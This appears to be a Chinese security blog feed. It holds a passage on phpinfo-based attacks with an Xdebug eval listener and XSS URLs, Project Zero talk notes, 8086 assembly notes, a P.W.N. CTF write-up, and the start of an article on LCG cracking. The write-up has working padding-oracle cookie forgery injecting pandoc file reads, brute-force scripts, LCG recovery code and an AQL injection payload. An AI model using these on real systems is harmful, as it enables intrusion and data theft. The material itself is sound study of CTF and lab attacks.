当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。 具体可以看另一篇文章php对象注入总结。 2.session.upload_progress加本地文件包含=getshell http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress xdebugxdebug命令执行 Xdebug: A Tiny Attack Surface Xdebug 攻击面在 PhpStorm 上的现实利用 http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug 123456789101112131415#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True: client_data = conn.recv(1024) print(client_data) data = raw_input('&gt;&gt; ') conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64')) GOPHER主要在ssrf中使用 利用 Gopher 协议拓展攻击面 fastcgiFastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 0x04其它OPCACHEphp不存在缓存文件，但是其有opcache，如果有文件上传就可以进行覆盖并getshell ‘act=’问题测试版本：PHP Version 5.6.22:发掘方法：右键源代码搜索：act= 1234http-sql-inject：http://target/phpinfo.php?act=Functionxss：http://target/phpinfo.php/&apos;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;csrf或跨域名点击劫持:http://target/phpinfo.php#bottom#fghj#dfghjk xss:http://target/phpinfo.php?act=rt&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt; 域&amp;用户phpinfo页面还能看到当前域，当前登录用户 工具 https://github.com/GoSecure/php7-opcache-override 参考 http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE]]></content>
  </entry>
  <entry>
    <title><![CDATA[project zero talk note]]></title>
    <url>%2F2018%2F11%2F12%2Fpz-talk-note%2F</url>
    <content type="text"><![CDATA[0x01 定位任务:让0day更难 工作: 漏洞研究 exploit开发 缓解设计和审查 0x02 Project Zero如何找bug1.我应该从哪儿找？ 优先级。 攻击者会在哪里看？重视单个研究人员的经验+专业知识 找到新的攻击面，或迭代已知的攻击面。 2.我应该怎么找？ 也就是怎么找到一个切入角度 选择处理不可信数据的输入点并找到其bugs。 选择一个bug类来查找实例。 选择一个功能/规范，找出不同实现中的常见缺陷。 查找已知问题的变形。 3.CVE-2018-10751 三星Galaxy S7 Edge中的OMACP溢出–由短信触发 通过寻找处理SMS的Intent找到 一年前，Contextis报道了一个类似的错误 4.FuzzingCanonical mutation fuzzing(大概意思是利用经典数据的变种来进行fuzz)：语料库创建，参数优化，模糊测试，覆盖反馈，崩溃分析。 自定义模糊测试，如定制生成器或文件格式突变感知。 5.手动审查有时是线性的：枚举函数列表并前向分析。 有时横向：找到一些脆弱属性的实例（错误类，重复错误，非标准模式），稍后建立“触发点”。 0x03 对未来的预测 手动分析方式不会改变 基本模糊测试结果不会很好 代码覆盖率反语料库推动新工作 静态分析对VR来说效率仍然不高]]></content>
  </entry>
  <entry>
    <title><![CDATA[汇编笔记]]></title>
    <url>%2F2018%2F11%2F11%2Fassembly-note%2F</url>
    <content type="text"><![CDATA[一、基础概念0.汇编基础能够被计算机直接识别的语言称之为机器语言，比如:00100000这种的，汇编语言是需要通过编译器转变为机器语言的。 计算机构成:输入/输出设备、存储器、运算器、控制器 1.基础单位信息bit=位 1/0 计算机最小信息单位 Byte=字节=8bit=B=1个存储单元 计算机最小存储单位 字(word)=2B=2byte 存储地址和存储内容一般用16进制表示 0x..或者H=十六进制(0,F) B=二进制(0,1) D=十进制(0,9) 2.CPU对存储器的读写ROM=&gt;BOIS芯片 CPU通过地址总线寻址、数据总线传输数据、控制总线进行操作来完成一些处理。 地址对应的是数据，因此地址总线的宽度也就是其一次最大能寻找到多少个字节的数据。 不同CPU的寄存器个数是不同的，但是都有通用寄存器 3.寄存器概念:CPU中程序员可以用指令读写的部件，寄存器数量有限(8086中有14个寄存器)，读写速度快。 内存单元是一个单元存放一个字节(8位二进制) 通用寄存器可用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。除此之外，它们还各自具有一些特殊功能。 数据是不能直接送入段地址寄存器(DS)中的; 16位寄存器可以拆分为两个8位寄存器进行使用; mov a1,[0]，此处的[]说明操作的是一个内存单元，[0]中的0说明这个内存单元的偏移地址是0，它的段地址默认放在ds寄存器中，使用时会被去出来。 PS: 1234累加寄存器在不同位计算机中的名字不同16位-AX32位-EAX64位-RAX 16位数据寄存器不能存放数据地址，但是32位的可以 3.1 数据寄存器 3.2 标志寄存器 3.2.1运算结果标志位ZF标志（ZeroFlag）： 零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，如果结果不为0，那么ZF=0。 PF标志（ParityFlag）： 奇偶标志位，它记录相关指令执行后，其结果的所有二进制位中1个个数是否为偶数，如果是偶数，PF=1，反之为0。 SF标志（SignFlag）： 符号标志位，它记录相关指令执行后，其结果是否为负，如果结果为负，SF=1，如果非负，SF=0。 CF标志（Carry进位，Flag标志）： 进位标志位，一般情况，进行无符号运算时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或借位，那么其值为1，否则其值为0。 OF标志（Overflow溢出，Flag标志）： 溢出标志位，在进行有符号数运算的时候，如果结果超出了机器所能表示的范围称为溢出，OF的值被置为1，否则OF的值为0。 注意：这里所说的溢出，只是对有符号运算而言。 3.2.2状态控制标志位TF标志（TrapFlag）： 追踪标志位，当追踪标志被置为1时，CPU进入单步执行方式，即每执行一条指令产生一个单步中断请求，这中方式主要用于程序的调试。 IF标志（Interrupt-enable Flag）： 中断允许标志位，用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求，但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。 当IF=1时，CPU可以相应CPU外部的可屏蔽中断发出的中断请求。 当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。 CPU的指令系统中也有专门的指令来改变标志位IF的值。 4.物理地址通常文件中至少含有两个段:代码段(存储程序的指令–可读，不可写，可执行)、数据段(存储需要的数据的指令–可读，可写，可执行) 二进制左移N位相当于这个二进制数乘以2的N次方 物理地址=段地址*16(又称基址)+偏移地址 任何时刻8086CPU都会将CS:IP指向的内容作为即将执行的指令(可以使用jmp对其进行修改操作) 一个物理地址可以对应多个逻辑地址，在编程的时候使用的是逻辑地址(=段基地址+段内偏移地址) 5.段地址 可以将若干地址连续的内存单元看做一个段 8086CPU有4个段寄存器，每个段寄存器用来确定一个逻辑段的起始位置，每种逻辑段均有各自的用途： CS（代码段）：指明代码的起始地址 利用CS：IP取得下一条要执行的指令 SS（堆栈段）：指明堆栈段的起始地址 利用SS：SP操作堆栈顶的数据 DS（数据段）：指明数据的起始地址 利用DS：EA存取数据段中的数据 ES（附加段）：指明附加段的起始地址 利用ES：EA存取附加段中的数据 PS: 1.在内存中，指令和数据没有任何区别，都是而二进制信息，只是CPU将有的数据看成指令，有的看成数据 2.一般的寄存器，如AX，可以使用mov ax,123来完成对其中数值的修改。但是像CS,IP这样的寄存器(用来从内存中寻址执行指令的)只能使用转移指令来修改，比如jmp–jum [段地址:]偏移地址，段地址和’:’缺省将只修改IP的值 3.操作中如果没有指明段前缀，则一般访问的是DS 123mov ax,[1000H];这两行都是等价的mov ax,ds:[1000H] 6.mov,add,sub指令123456789101112131415mov 寄存器,数据比如:mov ax,8mov 寄存器，寄存器比如:mov ax,bxmov 寄存器，内存单元比如:mov ax,[0]mov 内存单元，寄存器比如:mov [0],axmov 段寄存器，寄存器 //相反也对比如:mov ds,ax 关于mov的操作对象的说明: PS: 指令=操作码(+操作数) 7.栈(后入先出)两个关键寄存器:SS,SP-&gt;段地址,段偏移地址。这对寄存器将会指出栈顶地址。栈大小由我们自己安排所以要小心超界问题。 123456mov ax,0123Hpsuh axmov bx,2266Hpush bxpop ax //2266Hpop bx //0123H PS: 堆栈操作都是以字(2字节)为单位操作的。 8.开发环境配置win7及以上系统都没有debug了，所以都需要这个DOSBOX MAC OS环境下DOSBOX汇编环境的搭建 9.debug功能: 可以查看CPU寄存器的各种内容 可以查看内存的使用情况 可以在机器码级别跟踪程序的运行 常用操作: 二、程序0.程序运行1.程序加载到内存 2.CPU使用寄存器CS:IP找到程序即将执行指令的位置 1.伪指令伪指令不对应机器码，由编译器进行处理 12345678910111213141516// 将名字为codesg(标号 )的代码段跟cs寄存器联系起来assume cs:codesg// XXX segment 到 XXX ends标识了一个代码段codesg segment mov ax,0123H ... // 下面这两段实现了程序返回 mov ax,4c00H int 21H codesg endsend // 汇编程序结束的标志 将代码保存为asm格式的文件后就可以采用微软的masm汇编编译器来编译汇编代码。(注意编译后生成的是filename.obj还需要将其链接为可执行文件filename.exe，连接可以使用微软的Overlay Linker3.60连接器) 2.[bx]和loop指令mov ax,[bx]功能:bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SE:EA处的数据送入ax中，即(ax)=((ds)*16+(dx)) inc bx 是指bx中的内容加1 PS:用’()’来表示一个寄存器或者内存单元中的内容。比如(ax)就表示寄存器ax中的内容 loop指令实现循环公布功能,cx中保存了循环次数 12345678910111213141516assume cs:codesgcodesg segment mov ax,0123H mov cx,11 // s是一个标号 // 只要cx中的值不为0，则loop都回去执行标号s出的值s: add ax,ax loop s mov ax,4c00H int 21H codesg endsend 3.dw和end1234567891011121314151617assume cs:codesgcodesg segment dw 0123h,0456h,0789h,0defhstart: mov ax,0123H mov cx,11 // s是一个标号 // 只要cx中的值不为0，则loop都回去执行标号s出的值s: add ax,ax loop s mov ax,4c00H int 21H codesg endsend start dw定义了多个字符型数据，每个数据占用16个字节的内存空间。取用时从cs去的段地址，dw最先定义所以段偏移为0，之后bx加2操作进行连续取用。 end除了通知编译器程序结束外，还可以告诉编译器程序的入口在什么地方。 三、更灵活的定位内存地址的方法0.七种寻址方式寻址方式: 指令中指明操作数存放位置的表达方式。 寻址方式可以分为: 立即数寻址方式(存放在指令当中) mov AL,10H--&gt;立即数(只能是源操作数，即寄存器或者存储器) 寄存器寻址方式(存于寄存器中) inc cx;加1 dec cs;减1 mov ax,bx 存储器寻址方式(存放于存储器之中) | | mov ax,[25000H]--&gt;存储器操作数 | |-&gt; 直接寻址方式 | |-&gt; 寄存器间接寻址方式 | |-&gt; 寄存器相对寻址方式 | |-&gt; 基址加变址寻址方式 | |-&gt; 相对加基址变址寻址方式 1.and和or指令12345;可以将操作对象的相应位设为0，其它位保持不变and a1,11111110B;可以将操作对象的相应位设为1，其它位保持不变or a1,00000001B 2.ASCIIa字符–&gt;61H存储在指定空间中1234567;使用&apos;......&apos;指明数据是以字符的形式给出的data segment db &apos;unIX&apos;data ends;注意:小写字母的ASCII码值比大写字母的ASCII码值大20H 3.指令处理数据的长度1234;一个字单元mov word ptr ds:[0],1;一个字节单元mov byte ptr ds:[0],1 4.伪指令dddd-&gt;字节型数据dw-&gt;字型数据 12345678data segment;数据为01H，在data:0处，占1个字节 db 1;数据为0001H，在data:1处，占1个字 dw 1;数据为00000001H，在data:2处，占2个字节 dd 1data ends 5.dupdup配合db,dw,dd进行数据重复 1234;db 重复的次数 dup (重复的字节型数据)db 3 dup (0,1,2);定义了9个字节;相当于db 0,1,2,0,1,2,0,1,2 四、转移指令的原理可以修改IP，或同时修改CS和IP的指令统称为转移指令。 1.操作符 offsetoffset 可以取得标号的偏移地址 2.jmp指令jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP 1234;转到标号处执行命令,这个是jmp short 标号;段间转移jmp far ptr 标号 3.jcxz指令jcxz条件转移指令 1jcxz 标号 4.loop指令loop指令为循环指令 1loop 标号 5.in指令用于CPU从外设端口接收数据 6.out输出指令用于CPU向外设端口发送数据 7.xchg交换指令8.地址传送指令:LEA &amp; LDS &amp; LES123;reg16--16位通用寄存器;mem--存储单元LEA reg16,mem 9.标志传送指令:LAHF &amp; SAHF &amp; PUSHF &amp; POPF五、算数运算指令的原理1.加法指令• ADD(Addition) 加法指令 • ADC(Add withCarry)带进位加法指令 • INC(Increment)加 1指令 • AAA(ASCIIadjustforaddition)加法ASCII调整指令 • DAA(Decimaladjustforaddition)加法十进制调整指令 2.减法指令8086有7条减法指令: • SUB(Subtraction)减法指令 • SBB(SubtractionwithBorrow)进位减法指令 • DEC(Decrement by 1)减1指令 • NEG(Negate) 求补指令 • CMP(Compare)比较指令 • AAS(ASCII Adjust for Subtraction) 减法ASCII调整指令 • DAS(Decimal Adjust for Subtraction) 减法十进制调整指令 3. 乘法指令1）无符号乘法（MUL） 2）带符号乘法（IMUL） 4.除法指令1）无符号除法（DIV） 2）带符号除法（IDIV） 3）字节扩展指令（CBW） 4）字扩展指令（CWD） 5.十进制调整指令共六条 • AAA非压缩BCD码的加法十进制调整 • DAA压缩BCD码的加法十进制调整 • AAS非压缩BCD码的减法十进制调整 • DAS压缩BCD码的减法十进制调整 • AAM乘法的十进制调整 • AAD除法的十进制调整 六、逻辑运算和移位指令针对二进制0/1进行的操作 1.逻辑运算指令• AND逻辑“与”指令(有0则0) • TEST测试指令(只改变标志位) • OR逻辑“或”指令(有1则1) • XOR（exclusive OR)逻辑“异或”指令(相同为0，不同为1) • NOT逻辑“非”指令(不能是立即数) 2.移位指令• SAL (Shift Arithmetic Left)算术左移(无符号数乘2，最高位进CL) • SAR (Shiftarithmeticright)算术右移(无符号数除2，最低位进CF) • SHL (Shift logical left)逻辑左移(最低位不变，) • SHR (Shiftlogicalright)逻辑右移(最高位不变，低位移入CF) • ROL (Rotateleft)循环左移 • ROR (Rotateright)循环右移 • RCL (Rotateleftwith carry)带进位循环左移(就是循环时是带CF的) • RCR (Rotateright withcarry)带进位循环右移 七、串操作类指令• “串”就是内存中一段地址相连的字节B或字W； • 串操作，也叫数据块操作； • 可实现存储器数据间的直接传送； • 8086有5种基本串操作： MOVS（Move string）串传送指令 CMPS（Compare string）串比较指令 SCAS（Scan string）串扫描指令 LODS（Load from string）取串指令 STOS （Store in to string）存串指令 1.标志处理指令• CLC （Clearcarryflag)清C标志 • STC（Setcarryflag )置C标志 • CMC（Complementcarryflag）对C求反 • CLD（Cleardirectionflag)清D标志 • STD（Setdirectionflag)置D标志 • CLI（Clearinterruptflag)清I标志 • STI （Setinterruptenableflag)置I标志 2.其他处理机控制指令• NOP（Nooperation)空操作 • HLT（Halt) CPU暂停状态 • WAITCPU等待状态 • ESC交权 • LOCK（Lockbus)总线锁定 八、opcode操作码(Operation Code, OPCode) 描述机器语言指令中，指定要执行某种操作的机器码。 OPCode在不同的场合中通常具有不同的含义，例如PHP虚拟机(Zend VM)、java虚拟机(JVM) 以及一些软件保护虚拟机中的最小操作单元都可以称之为OPCode。 九、参考https://www.kanxue.com/book-31.htm 《汇编语言(第3版)》王爽著]]></content>
  </entry>
  <entry>
    <title><![CDATA[P.W.N. CTF Writeup]]></title>
    <url>%2F2018%2F11%2F02%2FP-W-N-CTF-note%2F</url>
    <content type="text"><![CDATA[Login SecLogin 1的代码如下: 123456789101112131415161718192021222324252627282930var http = require('http');const crypto = require('crypto');var url = require('url');var fs = require('fs');var _0x86d1=["\x68\x65\x78","\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"];function generatePart1() &#123; return &#123; x: crypto[_0x86d1[1]](8) &#125;[x].toString(_0x86d1[0]);&#125;function generatePart2() &#123; return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];&#125;http.createServer(function (req, res) &#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); passwd = generatePart1() + generatePart2(); var url_content = url.parse(req.url, true); if (passwd == url_content.query.passwd) &#123; res.write(fs.readFileSync('flag.txt', 'utf8')); &#125; else &#123; res.write('&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'); &#125; res.end();&#125;).listen(8888); 我在此将其简化一下，方便本地运行。 1234567891011121314151617const crypto = require('crypto');var _0x86d1=["\x68\x65\x78","\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"];function generatePart1() &#123; return &#123; x: crypto[_0x86d1[1]](8) &#125;[x].toString(_0x86d1[0]);&#125;function generatePart2() &#123; return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];&#125; passwd = generatePart1() + generatePart2(); console.log(passwd) 运行结果为: 12 zeroyu@zeros  ~/Desktop  node login.jsundefined1337 提交undefined1337得到flag的第一部分flag{W0w_1_gu3ss_th1s Login 2的代码如下，可以看出是md5的弱类型比较，只要求md5之后的值开头是0e即可，提交s878926199a得到下一部分的flag_t0_be_4_pr3tty_ 12345678910&lt;?phpinclude("flag.php");if (isset($_GET['passwd'])) &#123; if (hash("md5", $_GET['passwd']) == '0e514198428367523082236389979035') &#123; echo $flag; &#125; &#125; else &#123; echo '&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;';&#125; ?&gt; Login 3部分代码如下 123456789101112131415161718192021from flask import Flask, request, send_from_directoryapp = Flask(__name__)passwd = open("/opt/passwd.txt").read()flag = open("/opt/flag.txt").read()@app.route('/')def index(): userpw = request.args.get("passwd", "") if userpw == passwd: return flag, 200, &#123;"Content-Type": "text/plain"&#125; else: return '&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'if __name__ == '__main__': assert(len(passwd) == 3) assert(passwd.isdigit()) app.run() 关键在于一下两行: 12assert(len(passwd) == 3)assert(passwd.isdigit()) 这两行判断了从/opt/passwd.txt中读出的内容的长度是否是3，类型是否是数字。一般我们可能会字节考虑100-999,但是要知道000、009这些长度也是3，也是数字类型。所以写爆破脚本如下: 123456789import requestsfor i in range(0, 1000): url = "http://login3.uni.hctf.fun/?passwd=%03d" % i r = requests.get(url).content s = """&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;""" if(s != r.decode('utf-8')): print(i) break 最终爆破得到结果: 12 zeroyu@zeros  ~/Desktop  python testlogin.py7 提交007得到最后一部分flag 4_d4mn_l0ng_fl4g} Convertertarget:http://converter.uni.hctf.fun/ 分析之后，可以看到vals的长度是16的倍数1234567891011121314151617content=testvals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9128个字符content=testtestvals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961160个字符content=testtesttevals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265160个字符 比如以下这组数据: 123content=tvals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551 我们修改vals的第一位后发送请求，得到一个错误JSONDecodeError: Expecting value: line 1 column 1 (char 0)，修改最后一位发送请求，得到一个ValueError: Invalid padding bytes.。由以上两点可以看出，cookie中包含AES-CBC-encrypted JSON数据。所以在这种分组加密中我们可以联想到Padding Oracle攻击，关于这种攻击可以参考: 《Web狗要懂的Padding Oracle攻击》 《Padding_Oracle 攻击》 接下来我们使用脚本将cookie值进行解密: 12345678910111213141516171819202122232425# you need get padding_oracle from there# https://github.com/pspaul/padding-oracle# you need python3from padding_oracle import PaddingOraclefrom optimized_alphabets import json_alphabetimport requestsdef oracle(cipher_hex): headers = &#123;'Cookie': 'vals=&#123;&#125;'.format(cipher_hex)&#125; r = requests.get('http://converter.uni.hctf.fun/convert', headers=headers) response = r.content if b'Invalid padding bytes.' not in response: return True else: return Falseo = PaddingOracle(oracle, max_retries=-1)cipher = 'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())print('Plaintext: &#123;&#125;'.format(plain)) 解密后cookie的内容为{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}，一般这种文档转换使用的是pandoc，此处的f是控制输入格式，c是我们输入的内容，t是控制输出格式。 由题目可知我们要读取flag.txt中的内容，所以我们使用pandoc的-A参数，把flag.txt的内容包含出来。 -A FILE, –include-after-body=FILEInclude contents of FILE, verbatim, at the end of the document body (before the tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies –standalone. 要注意此处前端好像有白名单过滤，直接代入我们的参数话得不到我们想要的结果。 所以我在抓包之后修改cookie的值。cookie的生成脚本如下所示。 12345678910111213141516171819202122232425from padding_oracle import PaddingOraclefrom optimized_alphabets import json_alphabetimport requestsdef oracle(cipher_hex): headers = &#123;'Cookie': 'vals=&#123;&#125;'.format(cipher_hex)&#125; r = requests.get('http://converter.uni.hctf.fun/convert', headers=headers) response = r.content if b'Invalid padding bytes.' not in response: return True else: return Falseo = PaddingOracle(oracle, max_retries=-1)cipher = 'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'plain = b'&#123;"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"&#125;'plain_new = b'&#123;"f": "markdown -A flag.txt", "c": "D", "t": "html4"&#125;'cipher_new = o.craft(cipher, plain, plain_new)print('Modified: &#123;&#125;'.format(cipher_new)) 最终得到flag LCG and the X打开主页看到如下描述，最后一句Save secret messages prefixed with &quot;flag{&quot; (which is always handy...) 1234567Hello!This is the website for our on-campus fanclub of the band LCG and the X!Everyone can signup for the club to: Get the latest LCG news Communicate with other fans Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...) 接下我们进行注册登录，注册后可以看到如下信息： 12User Number: 34 Password: 4391179335210642486020975422279755323 bitmap图片的地址为http://lcgandthex.uni.hctf.fun/static/pics/34.bmp，bitmap图片名称前面的序号和我们用户名的相同，所以如果我们更改图片前面的序号还可以下载其他的bitmap图片。而这个bitmap图片还是作为password recovery token来使用的，所以我们就可以利用它来重置别的账户的密码。 接下来我们进行登录，登陆后可以看到这样的信息。 1234567NewsWebsite LaunchI just took the website online. I wrote it myself! I also just signed up to make sure the signup process works.Then I created a secret flag, which worked as well!Flag Storage MaintenanceBecause of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon... 可以看到对于我们这个账户而言，密码是被隐藏的，因此可能我们需要登录管理员的账户进行查看？那么管理员有可能是序号为1的那一个？那么我们就要考虑怎么去获取1号的密码了。因为这里的password recovery token没有地方去让我们使用，比赛结束后也有看别的战队是使用如下脚本分析了bitmap图片然后得到一些信息之后进行LCG破解的。 12345678910111213141516171819import mathimport osimport sysimport imageioif len(sys.argv) != 2: print("Usage: %s file.bmp" % sys.argv[0]) sys.exit(1)filename = sys.argv[1]image = imageio.imread(filename)out = 0for line in image: tmp = 0 for x in range(len(line)): tmp &lt;&lt;= 1 tmp |= 1 if line[x] == 255 else 0 print("% 40d" % tmp) 1234567891011121314151617对比两个用户bitmap图片中的信息可以发下现两者相差 313373133731337313373133731337这里只截取前五行34.bmp 10778143335877814333587781433348 8024293302815125776712035454147967229 8424888415969153255243735974754402615 3343897317520929957383430099400071436 12356584033995394658660863293223597252 35.bmp 11091516469609151646960915164685 9972138259316515878515303887207190382 7570417892854896822411051461517328212 16016475982551891670926030402121628733 9296242651229076123142121777120916609 之后再推算出一下值之后进行的攻击 123m = 16285270385112413720426683811263350667a = 313373133731337313373133731337c = 123456789012345678901234567890 但是我们这里不这么干，密码是LCG生成的(因为题目本身就提示了LCG这个算法)，那么我们这里就属于不清楚a\c\m的值对LCG生成器进行攻击，那么连续注册几个账号，采集一下密码输入一下脚本就好了。着这里使用burp多重放几次数据包就可以了，不用次都去输信息注册。 1234567891011121314User Number: 34 Password: 4391179335210642486020975422279755323 User Number: 35 Password: 10752978387235368639990800431243402580 User Number: 36 Password: 829507054147681073533941628943699170 User Number: 37 Password: 7191306106172407227503766637907346427 User Number: 38 Password: 13553105158197133381473591646870993684 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import mathimport functoolsreduce = functools.reducegcd = math.gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def modinv(b, n): g, x, _ = egcd(b, n) if g == 1: return x % ndef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): print('states', states) multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)print(crack_unknown_modulus([4391179335210642486020975422279755323, 10752978387235368639990800431243402580, 829507054147681073533941628943699170, 7191306106172407227503766637907346427, 13553105158197133381473591646870993684])) # m = 1 # the "multiplier"# c = 6361799052024726153969825008963647257 # the "increment"# n = 16285270385112413720426683811263350667 # the "modulus"class prng_lcg: m = 1 # the "multiplier" c = 6361799052024726153969825008963647257 # the "increment" n = 16285270385112413720426683811263350667 # the "modulus" def __init__(self, seed): self.state = seed # the "seed" def next(self): self.state = (self.state * self.m + self.c) % self.n return self.state def prev(self): self.state = (self.state - self.c) % self.n return int(self.state)#User Number: 46 #Password: 15591686419057701451952140284790119739 gen = prng_lcg(15591686419057701451952140284790119739) num = 45while num &gt; 0: p = gen.prev() print(num, p) if p == 4391179335210642486020975422279755323: print('sanity check: working') num -= 1# 1 =&gt; 6160325624856057770563639672902954513 最后登录得到flag PS:关于此处LCG攻击，你可以查看《攻击线性同余生成器(LCG)》 H!pster Startup主页代码里可以找到后台，所以就不用扫描了。 1234567&lt;!-- Main navigation --&gt;&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt; &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;&lt;/ul&gt;&lt;!-- /Main navigation --&gt; 后台测试发现是ArangoDB并且使用pyArango进行驱动程序。源码中存在如下内容，所以需要_id参数。 1234try : collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]except KeyError : raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i) 最终的payload为:1user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; // flag为 1flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125; 此处我在写note的时候，官方的题目已经关闭了，所以列出一些参考: [P.W.N. CTF 2018] H!pster Startup Write-up (Web216) P.W.N University: web 200 - H!pster Startup writeup 《P.W.N. CTF web题解》]]></content>
  </entry>
  <entry>
    <title><![CDATA[攻击线性同余生成器(LCG)]]></title>
    <url>%2F2018%2F11%2F02%2FCracking-LCG%2F</url>
    <content type="text"><![CDATA[0x00 前言目前我们在编程中经常会使用随机数，但是其中会不会存在什么问题呢？要知道CPU计算中的各种状态都是确定的，在其中的随机数不是凭空产生的，所以这种随机数真的随机吗？目前生成随机数的方式主要分为以下几种: 硬件随机数生成器 利用现有硬件，从非预期方式产生随机数(比如利用音频的产生、硬盘寻址时间等) 伪随机数 量子技术 PS: RDRAND指令产生的随机数目前存在争议，在此不做详细讨论。有兴趣可以参考 RdRand 虽然选择很多，但是目前还是主要采用伪随机数的方式来应对实际开发中需要的场景。用于产生这些看起来随机但实际是由确定性算法生成数字的机制被称为”伪随机数发生器”，简称为PRNG。 PRNG的中心是确定的，如果攻击者知道其内部的完整状态，则可以对未来的值和过去的值进行预测。如果PRNG被用于加密密钥、生成证书等场景，就会出现安全问题。 接下来我将详细讲解对线性同余发生器的攻击。 0x01 线性同余生成器(LCG)1.线性同余方法线性同余方法（LCG）是个产生伪随机数的方法。 它是根据递归公式： 其中A,B,M是产生器设定的常数。 LCG的周期最大为 M，但大部分情况都会少于M。要令LCG达到最大周期，应符合以下条件： B,M互质； M的所有质因数都能整除A-1； 若M是4的倍数，A-1也是； A,B,N[0]都比M小； A,B是正整数。 2.Python代码实现由上面的原理我们可以看到，其中最重要的是定义了三个整数，乘数A、增量B和模数M，因此我们在此用简单的几行Python代码实现一下: 123456789101112131415161718class prng_lcg: m = 672257317069504227 # &quot;乘数&quot; c = 7382843889490547368 # &quot;增量&quot; n = 9223372036854775783 # 